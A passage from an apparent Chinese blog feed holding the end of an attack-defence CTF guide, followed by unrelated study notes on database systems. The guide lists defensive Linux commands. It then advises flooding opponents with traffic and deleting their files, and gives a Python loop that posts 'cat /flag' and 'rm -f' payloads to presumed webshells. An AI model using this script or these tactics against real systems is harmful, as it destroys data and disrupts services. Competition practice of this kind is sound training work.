punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>防护常见命令</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">1 ssh &lt;-p 端口&gt; username@ip\n\n2 scp 文件路径 username@ip:存放路径\n\n3 cat &#x2F;root&#x2F;.bash_history\n\n4 #显示最近登录的5个帐号\n\n5 last -n 5|awk &#39;&#123;print $1&#125;&#39;\n\n6 #显示&#x2F;etc&#x2F;passwd的账户\n\n7 cat &#x2F;etc&#x2F;passwd|awk -F &#39;:&#39; &#39;&#123;print $1&#125;&#39;\n\n8 #查看UID为0的帐号\n\n9 awk -F: &#39;&#123;if($3&#x3D;&#x3D;0)print $1&#125;&#39; &#x2F;etc&#x2F;passwd10 #查找777的权限的文件\n\n11 find . -name &quot;*.php&quot; -perm 4777\n\n12 #查找24小时内被修改的PHP文件\n\n13 find .&#x2F; -mtime 0 -name &quot;*.php&quot;\n\n14 #查看进程\n\n15 ps aux | grep pid或者进程名\n\n16 #查看已建立的网络连接及进程\n\n17 netstat -antulp | grep EST\n\n18 #查看指定端口被哪个进程占用\n\n19 lsof -i:端口号 或者 netstat -tunlp|grep 端口号\n\n20 #结束进程命令\n\n21 kill PID\n\n22 killall &lt;进程名&gt;\n\n23 pkill &lt;进程名&gt;\n\n24 pkill -u用户名\n\n25 #封杀某个IP或者ip段\n\n26 iptables -I INPUT -s source_ip[&#x2F;mask] -j DROP\n\n27 #禁止从某个主机ssh远程访问登陆到本机\n\n28 iptable -t filter -A INPUT -s source_ip[&#x2F;mask] -p tcp --dport 22 -j DROP\n\n29 #备份mysql数据库\n\n30 mysqldump -u 用户名 -p 密码 数据库名 &gt; bak.sql\n\n31 mysqldump --all-databases &gt; bak.sql\n\n32 #还原mysql数据库\n\n33 mysql -u 用户名 -p 密码 数据库名 &lt; bak.sql\n\n34 #定时任务，在固定的时间间隔执行指定的系统指令或shell script\n\n35 crontab [-u user] file_name\n\n36 crontab [-u user] [-e |-l| -r]\n\n37 #检测所有的tcp连接数量及状态\n\n38 netstat -ant|awk|grep|sed -e -e|sort|uniq -c|sort -rn\n\n39 #查看页面访问排名前十的IP\n\n40 cat &#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log|cut -f1 -d|sort|uniq -c|sort -k -r|head -\n\n41 #查看页面访问排名前十的URL\n\n42 cat &#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log|cut -f4 -d|sort|uniq -c|sort -k -r|head -<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<h2 id=\"最后\"><a class=\"anchor\" href=\"#最后\">#</a> 最后</h2>\n<p>是要做一名合格的搅屎棍</p>\n<p>恶心别人，核心就是发送大量垃圾数据包给别人 ，让别人无法正常观察流量捕捉 payload ，此招就是干扰对手利用他人的 payload 给对手造成干扰。但是有些比赛可能也会禁止。</p>\n<p>我们拿到 shell 后在规则允许的情况我们可以删除别人的文件，别人 check 丢分也相当于自己加分。</p>\n<p><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">import</span> time\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">scan_attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token builtin\">file</span><span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">'shell.php'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'x.php'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'index.php'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'web.php'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'1.php'</span><span class=\"token punctuation\">&#125;</span>\n    payload<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">'cat /flag'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'ls -al'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'rm -f'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'echo 1'</span><span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">8802</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8804</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">for</span> ii <span class=\"token keyword\">in</span> <span class=\"token builtin\">file</span><span class=\"token punctuation\">:</span>\n                url<span class=\"token operator\">=</span><span class=\"token string\">'http://192.168.76.156:'</span><span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">'/'</span><span class=\"token operator\">+</span>ii\n                <span class=\"token keyword\">for</span> iii <span class=\"token keyword\">in</span> payload<span class=\"token punctuation\">:</span>\n                    data<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span>\n                        <span class=\"token string\">'payload'</span><span class=\"token punctuation\">:</span>iii\n                    <span class=\"token punctuation\">&#125;</span>\n                    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n                        requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span>data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">)</span>\n                        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"正在搅屎:\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">'|'</span><span class=\"token operator\">+</span>ii<span class=\"token operator\">+</span><span class=\"token string\">'|'</span><span class=\"token operator\">+</span>iii<span class=\"token punctuation\">)</span>\n                        time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.5</span><span class=\"token punctuation\">)</span>\n                    <span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> e<span class=\"token punctuation\">:</span>\n                        time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.5</span><span class=\"token punctuation\">)</span>\n                        <span class=\"token keyword\">pass</span>\n\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span>\n    scan_attack<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>最后的最后，准备 - 漏洞资源 - 漏洞资料库（比赛能不能联网无法确定，如刚结束的河南省赛，虽然允许联网，但是大部分博客平台被加入了黑名单）</p>\n",
            "tags": []
        },
        {
            "id": "https://blog.xcu.icu/2022/10/24/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/",
            "url": "https://blog.xcu.icu/2022/10/24/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/",
            "title": "数据库系统概述",
            "date_published": "2022-10-23T16:00:00.000Z",
            "content_html": "<p>[TOC]</p>\n<h1 id=\"11数据库系统概述\"><a class=\"anchor\" href=\"#11数据库系统概述\">#</a> 1.1 数据库系统概述</h1>\n<h2 id=\"111四个基本概念\"><a class=\"anchor\" href=\"#111四个基本概念\">#</a> 1.1.1 四个基本概念</h2>\n<h3 id=\"数据data选择填空\"><a class=\"anchor\" href=\"#数据data选择填空\">#</a> 数据（data）（选择填空）</h3>\n<p>数据是数据库中存储的基本对象</p>\n<p>定义：数据是描述事物的符号记录</p>\n<p>数据的种类有文本，图形，图像，音频，视频，学生的档案记录，货物的运输情况</p>\n<p>数据的特点：数据与语义是密不可分的（数据的含义称为数据的语义）</p>\n<p>数据是现象，而信息反应实质</p>\n<h3 id=\"数据库database\"><a class=\"anchor\" href=\"#数据库database\">#</a> 数据库（database）</h3>\n<p>定义：数据库是长期储存在计算机内，有组织的、可共享的大量数据的集合</p>\n<p>数据库的基本特征有</p>\n<ol>\n<li>数据按照一定的数据模型组织、描述和储存</li>\n<li>可为各种用户共享</li>\n<li>冗余度较小</li>\n<li>数据独立性较高</li>\n<li>易扩展</li>\n</ol>\n<h3 id=\"数据库管理系统dbmsdatabase-management-system\"><a class=\"anchor\" href=\"#数据库管理系统dbmsdatabase-management-system\">#</a> 数据库管理系统（DBMS）Database Management System</h3>\n<p>定义：位于用户余操作系统之间的一程数据管理软件<br />\n是基础软件，一个大型复杂的软件系统</p>\n<p>作用：科学地组织和储存数据、高效的维护和获取数据</p>\n<p>主要功能：</p>\n<ol>\n<li>数据定义功能：DDL</li>\n<li>数据组织、储存和管理</li>\n<li>数据操纵功能：DML</li>\n<li>数据库的事物管理和运行管理</li>\n<li>数据库的建立运行管理</li>\n<li>数据库的建立和维护功能</li>\n</ol>\n<p>常见的 DBMS</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">关系型数据库\n1. MySQL数据库\n2. Microsoft SQL Server数据库\n3. Oracle数据库\n4. Postgresql数据库\n5. Sybase数据库\n6. DB2数据库\n7. Access数据库\n非关系型数据库\n1. Mongodb数据库\n2. Redis数据库\n3. Hbase数据库\n4. Memcaced数据库<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220905094000162.png\" alt=\"image-20220905094000162\" /></p>\n<h3 id=\"数据库系统dbs\"><a class=\"anchor\" href=\"#数据库系统dbs\">#</a> 数据库系统（DBS）</h3>\n<p>定义：数据库系统是由数据库，数据库管理系统（及其应用开方工具）、应用程序和数据库管理员（DBA）组成的储存、管理、处理和维护数据的系统</p>\n<p>构成：</p>\n<ol>\n<li>数据库</li>\n<li>数据库管理系统（及其开发工具）</li>\n<li>应用系统</li>\n<li>数据库管理员</li>\n</ol>\n<h2 id=\"112数据库管理技术\"><a class=\"anchor\" href=\"#112数据库管理技术\">#</a> 1.1.2 数据库管理技术</h2>\n<p>数据管理定义：对数据进行・分类、组织、编码、存储检索和维护<br />\n数据处理的中心问题</p>\n<p>数据管理技术的三个阶段：</p>\n<ol>\n<li>人工管理阶段</li>\n<li>文件系统阶段</li>\n<li>数据库系统阶段</li>\n</ol>\n<h2 id=\"113数据系统的特点选择填空\"><a class=\"anchor\" href=\"#113数据系统的特点选择填空\">#</a> 1.1.3 数据系统的特点（选择填空）</h2>\n<h3 id=\"数据结构化\"><a class=\"anchor\" href=\"#数据结构化\">#</a> 数据结构化</h3>\n<p>整体结构化：</p>\n<ul>\n<li>不在仅仅针对某一个应用，而是面向整个组织或者企业</li>\n<li>不仅数据内部结构化，整体是结构化的，数据之间具有联系</li>\n</ul>\n<p>实现数据的真正结构化</p>\n<ol>\n<li>数据的结构用数据模型描述，无需程序定义和解释</li>\n<li>数据可以变长</li>\n<li>数据的最小获取单位是数据项</li>\n</ol>\n<h3 id=\"数据的共享性高冗余度低易扩展\"><a class=\"anchor\" href=\"#数据的共享性高冗余度低易扩展\">#</a> 数据的共享性高，冗余度低，易扩展</h3>\n<p>数据库系统从整体角度看待和描述数据，数据面向整个系统，可以被多个用户多个应用共享使用</p>\n<p>数据共享的好处：</p>\n<ul>\n<li>减少数据冗余，节约储存空间</li>\n<li>避免数据之间的不相容性与不一致性</li>\n<li>使系统易于扩充</li>\n</ul>\n<h3 id=\"数据独立性高\"><a class=\"anchor\" href=\"#数据独立性高\">#</a> 数据独立性高</h3>\n<p>物理独立性：指用户的应用程序与存储在磁盘上的数据库中数据是相互独立的。当数据的物理存储改变了，应用程序不用改变。</p>\n<p>逻辑独立性：指用户的应用程序与数据库的逻辑结构是相互独立的。数据的逻辑结构改变了，用户程序也可以不变。</p>\n<h3 id=\"数据由dbms统一管理和控制\"><a class=\"anchor\" href=\"#数据由dbms统一管理和控制\">#</a> 数据由 DBMS 统一管理和控制</h3>\n<p>DBMS 提供的数据控制功能</p>\n<p>(1) 数据的安全性（Security）保护 保护数据，以防止不合法的使用造成的数据的泄密和破坏。</p>\n<p>(2) 数据的完整性（Integrity）检查 将数据控制在有效的范围内，或保证数据之间满足一定的关系。</p>\n<p>(3) 并发（Concurrency）控制 对多用户的并发操作加以控制和协调，防止相互干扰而得到错误的结果。</p>\n<p>(4) 数据库恢复（Recovery） 将数据库从错误状态恢复到某一已知的正确状态。</p>\n<h1 id=\"12数据模型\"><a class=\"anchor\" href=\"#12数据模型\">#</a> 1.2 数据模型</h1>\n<p>在数据库中用数据模型这个工具来抽象、表示和处理现实世界中的数据和信息。<br />\n通俗地讲数据模型就是现实世界的模拟。</p>\n<p>数据模型应满足三方面要求</p>\n<ol>\n<li>能比较真实地模拟现实世界</li>\n<li>容易为人所理解</li>\n<li>便于在计算机上实现</li>\n</ol>\n<p>注：数据模型是数据库系统的核心和基础</p>\n<h2 id=\"121两大类数据模型了解\"><a class=\"anchor\" href=\"#121两大类数据模型了解\">#</a> 1.2.1 两大类数据模型（了解）</h2>\n<ol>\n<li>概念模型<br />\n也称信息模型，它是按用户的观点来对信息和信息建模，用于数据库设计</li>\n<li>逻辑模型：主要包括网状模型、层次模型、关系模型、面向对象模型等，按计算机系统的观点对数据建模，用于 DBMS 实现。<br />\n物理模型：是对数据最底层的抽象，描述数据在系统内部的表示方式和存取方法，在磁盘或磁带上的存储方式和存取方法。</li>\n</ol>\n<h2 id=\"122概念模型\"><a class=\"anchor\" href=\"#122概念模型\">#</a> 1.2.2 概念模型</h2>\n<p>概念模型：</p>\n<ul>\n<li>概念模型用于信息世界的建模</li>\n<li>是现实世界到机器世界的一个中间层次</li>\n<li>是数据库设计的有力工具 数据库设计人员和用户之间进行交流的语言</li>\n</ul>\n<p>对概念模型的基本要求：</p>\n<ul>\n<li>较强的语义表达能力</li>\n<li>能够方便、直接地表达应用中的各种语义知识</li>\n<li>简单、清晰、易于用户理解</li>\n</ul>\n<h3 id=\"信息世界中的基本概念\"><a class=\"anchor\" href=\"#信息世界中的基本概念\">#</a> 信息世界中的基本概念</h3>\n<ol>\n<li>\n<p>实体（Entity）  客观存在并可相互区别的事物称为实体。 可以是具体的人、事、物或抽象的概念。</p>\n</li>\n<li>\n<p>属性（Attribute）  实体所具有的某一特性称为属性。 一个实体可以由若干个属性来刻画。</p>\n</li>\n<li>\n<p>码（Key）  唯一标识实体的属性集称为码。</p>\n</li>\n<li>\n<p>域（Domain）  属性的取值范围称为该属性的域。</p>\n</li>\n<li>\n<p>实体型（Entity Type）  用实体名及其属性名集合来抽象和刻画同类实体称为实体型</p>\n</li>\n<li>\n<p>实体集（Entity Set）  同一类型实体的集合称为实体集</p>\n</li>\n<li>\n<p>联系（Relationship）   现实世界中事物内部以及事物之间的联系在信息世界中反映为实体内部的联系和实体之间的联系。</p>\n<p><code>实体内部</code> 的联系通常是指组成实体的各属性之间的联系</p>\n<p><code>实体之间</code> 的联系通常是指不同实体集之间的联系</p>\n</li>\n</ol>\n<h3 id=\"概念模型的一种表示方法\"><a class=\"anchor\" href=\"#概念模型的一种表示方法\">#</a> 概念模型的一种表示方法</h3>\n<p>概念模型的表示方法 —E-R 图、<strong>实体－联系方法</strong> (E-R 方法)</p>\n<ul>\n<li>用 E-R 图来描述现实世界的概念模型</li>\n<li>E-R 方法也称为 E-R 模型</li>\n</ul>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220905112912981.png\" alt=\"image-20220905112912981\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220905112937613.png\" alt=\"image-20220905112937613\" /></p>\n<h2 id=\"123数据模型的组成要素三个\"><a class=\"anchor\" href=\"#123数据模型的组成要素三个\">#</a> 1.2.3 数据模型的组成要素（三个）</h2>\n<h3 id=\"数据结构\"><a class=\"anchor\" href=\"#数据结构\">#</a> 数据结构</h3>\n<p>数据结构描述数据库的组成对象，以及对象之间的联系</p>\n<p>对系统静态的描述</p>\n<h3 id=\"数据操作\"><a class=\"anchor\" href=\"#数据操作\">#</a> 数据操作</h3>\n<p>对数据库中的对象的实例（值）允许执行的操作以及相关的操作规则，对系统动态的描述</p>\n<h3 id=\"完整性约束条件\"><a class=\"anchor\" href=\"#完整性约束条件\">#</a> 完整性约束条件</h3>\n<p>一组完整性规则的集合。</p>\n<p>完整性规则：给定的数据模型中数据及其联系所具有的制约和储存规则</p>\n<p>用以限定符合数据模型的数据库状态以及状态的变化，以保证数据的正确、有效、相容。</p>\n<h2 id=\"124最常用的数据模型\"><a class=\"anchor\" href=\"#124最常用的数据模型\">#</a> 1.2.4 最常用的数据模型</h2>\n<p>非关系模型</p>\n<p>层次模型 (Hierarchical Model) 网状模型 (Network Model)</p>\n<p>关系模型 (Relational Model)   面向对象模型 (Object Oriented Model）<br />\n对象关系模型 (Object Relational Model)</p>\n<p>基本层次联系是指两个记录以及它们之间的一对多（包括一对一）的联系</p>\n<h2 id=\"125层次模型\"><a class=\"anchor\" href=\"#125层次模型\">#</a> 1.2.5 层次模型</h2>\n<h3 id=\"1-层次模型的数据结构\"><a class=\"anchor\" href=\"#1-层次模型的数据结构\">#</a> 1、层次模型的数据结构</h3>\n<p>在数据库中定义满足下面两个条件的基本层次联系的集合为层次模型</p>\n<ol>\n<li>有且只有一个节点没有双亲结点，这个结点被称为根结点</li>\n<li>根以外的其他结点有且只有一个双亲结点</li>\n</ol>\n<p>每个结点表示一个记录类型，记录类型之间的联系用结点之间的连线表示，这种联系是父子之间的一对多的关系</p>\n<h3 id=\"2-层次模型的数据操纵与完整性约束\"><a class=\"anchor\" href=\"#2-层次模型的数据操纵与完整性约束\">#</a> 2、层次模型的数据操纵与完整性约束</h3>\n<p>层次模型的数据操纵主要有查询、插入、删除和更新，操纵时要保证层次模型完整性约束条件</p>\n<h3 id=\"3-层次模型的优缺点\"><a class=\"anchor\" href=\"#3-层次模型的优缺点\">#</a> 3、层次模型的优缺点</h3>\n<p>优点：</p>\n<ol>\n<li>层次模型的数据结构比较简单清晰</li>\n<li>层次数据库的查询效率高</li>\n<li>层次数据模型提供了良好的完整性支撑</li>\n</ol>\n<p>缺点：</p>\n<ol>\n<li>现实世界中很多联系是非层次性的，如结点之间具有多对多联系，不适合层次模型表示</li>\n<li>如果一个结点具有多个双亲结点编写很复杂</li>\n<li>查询子女结点必须通过双亲结点</li>\n<li>由于结构严密，层次命令趋于程序化</li>\n</ol>\n<h2 id=\"126网状模型\"><a class=\"anchor\" href=\"#126网状模型\">#</a> 1.2.6 网状模型</h2>\n<h3 id=\"1-网状模型的数据结构\"><a class=\"anchor\" href=\"#1-网状模型的数据结构\">#</a> 1、网状模型的数据结构</h3>\n<p>在数据库中满足下面两个条件的基本层次联系集合称为网状模型</p>\n<ol>\n<li>允许一个以上的结点无双亲</li>\n<li>一个结点可以有对于一个的双亲</li>\n</ol>\n<h3 id=\"2-网状模型的数据操纵与完整性约束\"><a class=\"anchor\" href=\"#2-网状模型的数据操纵与完整性约束\">#</a> 2、网状模型的数据操纵与完整性约束</h3>\n<ol>\n<li>支持记录码的概念，码即唯一标识记录的数据项的集合</li>\n<li>保证一个联系中双亲记录和子女记录之间是一对多的关系</li>\n<li>可以支持双亲和子女记录之间</li>\n</ol>\n<h3 id=\"3-网状模型的优缺点\"><a class=\"anchor\" href=\"#3-网状模型的优缺点\">#</a> 3、网状模型的优缺点</h3>\n<p>优点：</p>\n<ol>\n<li>能够更为直接的描述现实世界，如一个结点可以有多个双亲，结点之间可以有多种联系</li>\n<li>具有良好的性能，存取效率较高</li>\n</ol>\n<p>缺点：</p>\n<ol>\n<li>结构比较复杂，而且伴随着应环境的扩大，数据库的结构就变得越来越复杂</li>\n</ol>\n<h2 id=\"127关系模型\"><a class=\"anchor\" href=\"#127关系模型\">#</a> 1.2.7 关系模型</h2>\n<p>关系数据库系统采用关系模型作为数据的组织方式</p>\n<h3 id=\"1-关系数据模型的数据结构\"><a class=\"anchor\" href=\"#1-关系数据模型的数据结构\">#</a> 1、关系数据模型的数据结构</h3>\n<p>在用户观点下，关系模型中数据的逻辑结构是一张二维表，它由行和列组成。</p>\n<ul>\n<li>关系（Relation） 一个关系对应通常说的一张表</li>\n<li>元组（Tuple） 表中的一行即为一个元组</li>\n<li>属性（Attribute）   表中的一列即为一个属性，给每一个属性起一个名称即属性名</li>\n<li>主码（Key） 表中的某个属性组，它可以唯一确定一个元组。</li>\n<li>域（Domain） 属性的取值范围。</li>\n<li>分量 元组中的一个属性值。</li>\n<li>关系模式 对关系的描述</li>\n</ul>\n<p>关系必须是规范化的，满足一定的规范条件<br />\n最基本的规范条件：关系的每一个分量必须是一个不可分的数据项，不允许表中还有表</p>\n<h3 id=\"2-关系数据模型的操纵与完整性约束\"><a class=\"anchor\" href=\"#2-关系数据模型的操纵与完整性约束\">#</a> 2、关系数据模型的操纵与完整性约束</h3>\n<ul>\n<li>数据操作是集合操作，操作对象和操作结果都是关系</li>\n<li>数据操作是集合操作，操作对象和操作结果都是关系，即若干元组的集合</li>\n<li>存取路径对用户透明 / 隐蔽，用户只要指出 “干什么”，不必详细说明 “怎么干”</li>\n</ul>\n<h3 id=\"3-关系数据模型的优缺点\"><a class=\"anchor\" href=\"#3-关系数据模型的优缺点\">#</a> 3、关系数据模型的优缺点</h3>\n<p>优点：</p>\n<ol>\n<li>建立在严格的数学概念的基础上</li>\n<li>概念单一<br />\n实体和各类联系都用关系来表示<br />\n对数据的检索结果也是关系</li>\n<li>关系模型的存取路径对用户透明<br />\n具有更高的数据独立性，更好的安全保密性<br />\n简化了程序员的工作和数据库开发建立的工作</li>\n</ol>\n<p>缺点：</p>\n<ol>\n<li>存取路径对用户透明导致查询效率往往不如非关系数据模型</li>\n<li>为提高性能，必须对用户的查询请求进行优化    增加了开发 DBMS 的难度</li>\n</ol>\n<h1 id=\"13数据库系统结构\"><a class=\"anchor\" href=\"#13数据库系统结构\">#</a> 1.3 数据库系统结构</h1>\n<h3 id=\"131数据库系统模式的概念\"><a class=\"anchor\" href=\"#131数据库系统模式的概念\">#</a> 1.3.1 数据库系统模式的概念</h3>\n<h4 id=\"模式\"><a class=\"anchor\" href=\"#模式\">#</a> 模式</h4>\n<ul>\n<li>数据库全体数据逻辑结构和特征的描述</li>\n<li>是型的描述</li>\n<li>反映的是数据的结构及其联系</li>\n<li>模式是相对稳定的</li>\n</ul>\n<p>型是对一类型的结构和属性的说明<br />\n值是型的一个具体赋值</p>\n<h3 id=\"132数据库系统的三级映像\"><a class=\"anchor\" href=\"#132数据库系统的三级映像\">#</a> 1.3.2 数据库系统的三级映像</h3>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220914203111627.png\" alt=\"image-20220914203111627\" /></p>\n<h4 id=\"1-模式\"><a class=\"anchor\" href=\"#1-模式\">#</a> 1、模式</h4>\n<ol>\n<li>\n<p>模式也叫逻辑结构</p>\n<ul>\n<li>\n<p>数据库中全体数据的逻辑结构和特征的描述</p>\n</li>\n<li>\n<p>所有用户的公共数据视图，综合了所有用户的需求</p>\n</li>\n</ul>\n</li>\n<li>\n<p>一个数据库只有一个模式</p>\n</li>\n<li>\n<p>模式的地位：是数据库系统模式结构的中间层</p>\n<ul>\n<li>与数据的物理存储细节和硬件环境无关</li>\n<li>与具体的应用程序、开发工具及高级程序设计语言无关</li>\n</ul>\n</li>\n</ol>\n<p>逻辑结构：数据记录由哪些数据项组成，数据项的名字，类型，取值范围等，而且要定义数据之间的联系，与数据有关的安全性，完整性操作。</p>\n<h4 id=\"2-外模式\"><a class=\"anchor\" href=\"#2-外模式\">#</a> 2、外模式</h4>\n<ol>\n<li>\n<p>外模式也叫做子模式</p>\n<ul>\n<li>\n<p>数据库用户（包括应用程序员和最终用户）使用的局部数据的逻辑结构和特征的描述</p>\n</li>\n<li>\n<p>数据库用户的数据视图，是与某一应用有关的数据的逻辑表示</p>\n</li>\n</ul>\n</li>\n<li>\n<p>外模式的地位：介于模式与应用之间</p>\n<ul>\n<li>模式与外模式的关系：一对多</li>\n</ul>\n<p>外模式是模式的子集，一个数据库可以有多个外模式反应了不同的用户的应用需求、看待数据的方式、对数据保密的要求</p>\n<p>对模式中同一数据，在外模式中的结构、类型、长度、保密级别等都可以不同</p>\n<ul>\n<li>外模式与应用的关系：一对多</li>\n</ul>\n<p>同一外模式也可以为某一用户的多个应用系统所使用<br />\n但一个应用程序只能使用一个外模式</p>\n</li>\n<li>\n<p>外模式的用途</p>\n<ul>\n<li>保证数据库安全性的一个有力措施</li>\n<li>每个用户只能看见和访问所对应的外模式中的数据</li>\n</ul>\n</li>\n</ol>\n<p>外模式是从模式导出的一个子集，包含模式中允许特定用户使用的那部分数据。用户可以通过外模式描述语言来描述、定义对应于用户的数据记录 (外模式)，也可以利用数据操纵语言 (DML) 对这些数据记录进行。外模式反映了数据库的用户观。</p>\n<h4 id=\"3-内模式\"><a class=\"anchor\" href=\"#3-内模式\">#</a> 3、内模式</h4>\n<ol>\n<li>\n<p>内模式也称为储存模式</p>\n<ul>\n<li>\n<p>是数据物理结构和储存方式的描述</p>\n</li>\n<li>\n<p>是数据在数据库内部的表示方式</p>\n<ul>\n<li>记录的存储方式（顺序存储，按照 B 树结构存储，按 hash 方法存储）</li>\n<li>索引的组织方式</li>\n<li>数据是否压缩存储</li>\n<li>数据是否加密</li>\n<li>数据存储记录结构的规定</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p>一个数据库只有一个内模式</p>\n</li>\n</ol>\n<h3 id=\"133数据库的二级映像域数据独立性\"><a class=\"anchor\" href=\"#133数据库的二级映像域数据独立性\">#</a> 1.3.3 数据库的二级映像域数据独立性</h3>\n<ol>\n<li>\n<p>三级模式是对数据的三个抽象级别</p>\n</li>\n<li>\n<p>二级映象在 DBMS 内部实现这三个抽象层次的联系和转换</p>\n<ul>\n<li>\n<p>外模式／模式映像</p>\n</li>\n<li>\n<p>模式／内模式映像</p>\n</li>\n</ul>\n</li>\n</ol>\n<h4 id=\"外模式模式映像\"><a class=\"anchor\" href=\"#外模式模式映像\">#</a> 外模式／模式映像</h4>\n<p>保证数据的逻辑独立性:</p>\n<ul>\n<li>当模式改变时，数据库管理员修改有关的外模式 / 模式映象，使外模式保持不变</li>\n<li>应用程序是依据数据的外模式编写的，从而应用程序不必修改，保证了数据与程序的逻辑独立性，简称数据的逻辑独立性。</li>\n</ul>\n<h4 id=\"模式内模式映像\"><a class=\"anchor\" href=\"#模式内模式映像\">#</a> 模式／内模式映像</h4>\n<ol>\n<li>模式／内模式映象定义了数据全局逻辑结构与存储结构之间的对应关系。</li>\n<li>数据库中模式／内模式映象是唯一的</li>\n<li>该映象定义通常包含在模式描述中</li>\n<li>保证数据的物理独立性\n<ul>\n<li>当数据库的存储结构改变了（例如选用了另一种存储结构），数据库管理员修改模式／内模式映象，使模式保持不变</li>\n<li>应用程序不受影响。保证了数据与程序的物理独立性，简称数据的物理独立性。</li>\n</ul>\n</li>\n<li>数据库的二级映像\n<ul>\n<li>保证了数据库外模式的稳定性</li>\n<li>从底层保证了应用程序的稳定性，除非应用需求本身发生变化，否则应用程序一般不需要修改</li>\n</ul>\n</li>\n<li>数据与程序之间的独立性，使得数据的定义和描述可以从应用程序中分离出去</li>\n<li>数据的存取由 DBMS 管理\n<ul>\n<li>用户不必考虑存取路径等细节</li>\n<li>简化了应用程序的编制</li>\n<li>大大减少了应用程序的维护和修改</li>\n</ul>\n</li>\n</ol>\n<h1 id=\"14数据库系统的组成\"><a class=\"anchor\" href=\"#14数据库系统的组成\">#</a> 1.4 数据库系统的组成</h1>\n<ol>\n<li>\n<p>数据库</p>\n</li>\n<li>\n<p>数据库管理系统（及其开发工具）</p>\n</li>\n<li>\n<p>应用系统</p>\n</li>\n<li>\n<p>数据库管理员</p>\n</li>\n<li>\n<p>硬件平台及数据库</p>\n<ul>\n<li>足够大的内存 --- 操作系统、DBMS 的核心模块 、数据缓冲区、 应用程序</li>\n<li>足够大的外存 ----- 